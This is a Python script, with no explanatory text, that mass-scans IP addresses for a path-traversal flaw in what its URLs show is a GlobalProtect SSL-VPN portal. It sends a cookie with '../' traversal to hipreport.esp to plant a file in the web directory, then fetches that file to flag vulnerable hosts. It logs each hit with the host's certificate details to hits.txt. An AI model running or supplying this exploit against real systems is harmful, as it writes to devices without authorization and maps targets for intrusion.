import asyncio
import aiohttp
import argparse
import ssl
import socket
from cryptography import x509
from cryptography.hazmat.backends import default_backend

async def send_requests(ip_address, session, output_file):
    post_url = f"https://{ip_address}/ssl-vpn/hipreport.esp"
    get_url = f"https://{ip_address}/global-protect/portal/images/sxy.txt"

    post_headers = {
        "Host": ip_address,
        "Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/sxy.txt;",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    post_data = ""

    get_headers = {
        "Host": ip_address,
        "Connection": "close"
    }

    # Execute the POST request
    try:
        async with session.post(post_url, headers=post_headers, data=post_data, ssl=False) as post_response:
            # Wait for the POST request to complete
            await post_response.read()

            # Execute the GET request
            async with session.get(get_url, headers=get_headers, ssl=False) as get_response:
                if get_response.status == 403:
                    message = f"[+] Vulnerable Host: {ip_address} --- {get_url}"
                    print(message)
                    with open(output_file, 'a') as f:
                        f.write(message + "\n")
                    await get_ssl_certificate(ip_address, output_file)

    except Exception as e:
        error_message = f"Error connecting to {ip_address}: {str(e)}"
        print(error_message)
        with open(output_file, 'a') as f:
            f.write(error_message + "\n")

async def get_ssl_certificate(ip_address, output_file):
    hostname = ip_address
    port = 443

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.set_ciphers('HIGH:!DH:!aNULL')
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection((hostname, port)) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                ssock.do_handshake()
                cert_bin = ssock.getpeercert(True)
                if cert_bin:
                    cert = x509.load_der_x509_certificate(cert_bin, default_backend())
                    subject = cert.subject
                    issuer = cert.issuer
                    subject_str = f"Subject: {subject}"
                    issuer_str = f"Issuer: {issuer}"
                    print(subject_str)
                    print(issuer_str)
                    print(f'{"-" * 40}')
                    with open(output_file, 'a') as f:
                        f.write(subject_str + "\n")
                        f.write(issuer_str + "\n")
                        f.write(f'{"-" * 40}\n')
                else:
                    message = "Failed to retrieve certificate."
                    print(message)
                    with open(output_file, 'a') as f:
                        f.write(message + "\n")
    except Exception as e:
        error_message = f"Failed to connect or retrieve SSL certificate from {ip_address}: {str(e)}"
        print(error_message)
        with open(output_file, 'a') as f:
            f.write(error_message + "\n")

async def process_addresses(addresses, output_file):
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_requests(ip, session, output_file) for ip in addresses]
        await asyncio.gather(*tasks)

def main():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('-host', metavar='IP', help="A single IP address to test")
    parser.add_argument('-list', metavar='FILE', help="A file containing a list of IP addresses to test")
    args = parser.parse_args()

    output_file = "hits.txt"

    if args.host:
        asyncio.run(process_addresses([args.host], output_file))
    elif args.list:
        try:
            with open(args.list, 'r') as file:
                ip_addresses = [line.strip() for line in file if line.strip()]
            asyncio.run(process_addresses(ip_addresses, output_file))
        except FileNotFoundError:
            print(f"No such file: {args.list}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
